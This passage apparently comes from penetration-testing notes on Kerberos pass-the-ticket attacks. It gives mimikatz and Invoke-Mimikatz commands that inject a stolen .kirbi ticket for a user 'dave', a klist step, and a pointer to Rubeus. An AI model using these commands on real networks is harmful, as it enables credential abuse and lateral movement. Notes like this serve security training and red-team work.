4. Pass the ticket: `mimikatz # kerberos::ptt *[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi*` or `invoke-mimikatz -Command '"Mimikatz::debug "kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi" "exit"'
5. To list and show all the tickets that you have: `klist`**

### Pass the ticket 2
1. Use Rubeus instead of mimikatz
